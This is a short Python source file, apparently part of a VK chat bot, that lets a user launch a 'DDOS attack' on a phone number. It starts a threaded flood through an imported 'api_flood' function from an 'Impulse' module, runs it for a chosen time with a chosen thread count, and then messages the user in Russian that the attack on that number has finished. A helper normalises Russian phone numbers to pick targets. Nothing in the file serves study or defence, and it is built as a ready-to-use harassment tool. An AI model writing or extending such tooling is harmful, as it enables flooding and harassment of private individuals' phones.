import threading
from threading import Thread

from src.Impulse.impulse import api_flood, threads_ddos
from src.api import messages_send
from src.connect import VK


def call_ddos_number(user_id: str, number: str, time: int, threads: int):
    threads_ddos[user_id] = Thread(target=api_flood, args=(number, int(time), int(threads)))
    threads_ddos[user_id].start()
    clear_thread = threading.Timer(time, __end_ddos_attack, [user_id, number])
    clear_thread.start()


def __end_ddos_attack(user_id: str, number: str):
    del threads_ddos[user_id]
    messages_send(user_id, f"DDOS атака на номер {number} успешно закончена!")


def parse_number(number: str) -> str:
    if number.startswith("+7"):
        return number[2:]
    elif number.startswith("8") and len(number) == 11:
        return number[1:]
    else:
        return number